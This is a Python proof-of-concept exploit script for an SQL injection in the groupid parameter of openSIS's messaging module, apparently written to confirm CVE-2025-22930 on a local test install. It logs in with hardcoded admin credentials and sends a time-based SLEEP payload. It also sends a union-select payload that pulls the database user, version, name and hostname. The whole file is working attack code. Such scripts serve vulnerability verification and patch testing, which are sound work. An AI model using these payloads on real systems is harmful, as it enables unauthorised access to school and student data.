#!/usr/bin/env python3
"""
CVE-2025-22930 - openSIS SQL Injection PoC
Based on: https://github.com/esusalla/vulnerability-research/tree/main/CVE-2025-22930

Vulnerability: SQL injection via groupid parameter at /messaging/Group.php
Affected: OS4ED openSIS v7.0 to v9.1
"""
import requests
import sys
import time

TARGET_URL = "http://localhost:8089"
USERNAME = "admin"
PASSWORD = "Admin123!"


def login(session, base_url, username, password):
    """Login to openSIS and get authenticated session"""
    login_url = f"{base_url}/index.php"
    
    resp = session.get(login_url, timeout=10)
    
    if "TOKEN' value='" not in resp.text:
        print("[-] Could not find CSRF token in login page")
        return False
    
    try:
        token = resp.text.split("TOKEN' value='")[1].split("'")[0]
    except IndexError:
        print("[-] Failed to extract CSRF token")
        return False
    
    login_data = {
        'USERNAME': username,
        'PASSWORD': password,
        'TOKEN': token,
        'language': 'en',
        'log': ''
    }
    
    resp = session.post(login_url, data=login_data, allow_redirects=True, timeout=10)
    
    # Login success shows an iframe with Modules.php
    if "Modules.php" in resp.text and "failed_login=0" in resp.text:
        return True
    
    if "Invalid" in resp.text or "incorrect" in resp.text.lower():
        return False
    
    return False


def test_time_based_sqli(session, base_url, delay=5):
    """Test time-based blind SQL injection (official PoC payload)"""
    payload = f'0+union+select+sleep({delay}),null,null,null,null,null,null'
    url = f'{base_url}/Modules.php?modname=messaging/Group.php&modfunc=members&groupid={payload}'
    
    print(f"\n[*] Testing time-based SQLi with SLEEP({delay})")
    print(f"    URL: {url[:100]}...")
    
    start_time = time.time()
    try:
        resp = session.get(url, allow_redirects=False, timeout=delay + 10)
        elapsed = time.time() - start_time
        
        if elapsed >= delay:
            print(f"[+] VULNERABLE! Response delayed by {elapsed:.2f}s (expected >= {delay}s)")
            return True, elapsed
        else:
            print(f"[-] No delay detected ({elapsed:.2f}s)")
            return False, elapsed
    except requests.exceptions.Timeout:
        elapsed = time.time() - start_time
        print(f"[+] VULNERABLE! Request timed out after {elapsed:.2f}s")
        return True, elapsed
    except Exception as e:
        print(f"[-] Error: {e}")
        return False, 0


def test_union_sqli(session, base_url):
    """Test union-based SQL injection to extract data"""
    payload = '0+union+select+user(),version(),database(),@@hostname,null,null,null'
    url = f'{base_url}/Modules.php?modname=messaging/Group.php&modfunc=members&groupid={payload}'
    
    print(f"\n[*] Testing union-based SQLi to extract database info")
    
    try:
        resp = session.get(url, allow_redirects=False, timeout=10)
        if resp.status_code == 200 and len(resp.text) > 100:
            print(f"[*] Response length: {len(resp.text)} bytes")
            return True, resp.text
        return False, resp.text
    except Exception as e:
        print(f"[-] Error: {e}")
        return False, str(e)


def main():
    print("=" * 70)
    print("CVE-2025-22930 - openSIS SQL Injection PoC")
    print("Vulnerability: SQL injection via groupid parameter")
    print("Location: /Modules.php?modname=messaging/Group.php&modfunc=members")
    print("Reference: https://github.com/esusalla/vulnerability-research")
    print("=" * 70)
    
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0"
    })
    
    print(f"\n[*] Target: {TARGET_URL}")
    print(f"[*] Credentials: {USERNAME} / {PASSWORD}")
    print("[*] Attempting login...")
    
    if login(session, TARGET_URL, USERNAME, PASSWORD):
        print("[+] Login successful")
    else:
        print("[-] Login failed")
        print("[!] Make sure openSIS is installed with admin account:")
        print(f"    Username: {USERNAME}")
        print(f"    Password: {PASSWORD}")
        return 1
    
    print("\n[*] Starting SQL injection tests...")
    
    vulnerable = False
    
    vuln, elapsed = test_time_based_sqli(session, TARGET_URL, delay=5)
    if vuln:
        vulnerable = True
    
    vuln, data = test_union_sqli(session, TARGET_URL)
    if vuln:
        vulnerable = True
    
    print("\n" + "=" * 70)
    print("RESULTS SUMMARY")
    print("=" * 70)
    
    if vulnerable:
        print("[+] CVE-2025-22930 CONFIRMED - SQL Injection Vulnerability")
        print("[+] The groupid parameter is vulnerable to SQL injection")
        print("\n[*] Impact:")
        print("    - Data extraction from database")
        print("    - Potential data modification/deletion")
        print("    - Information disclosure")
        return 0
    else:
        print("[-] Could not confirm vulnerability")
        print("    Note: Requires valid authenticated session")
        return 1


if __name__ == "__main__":
    sys.exit(main())
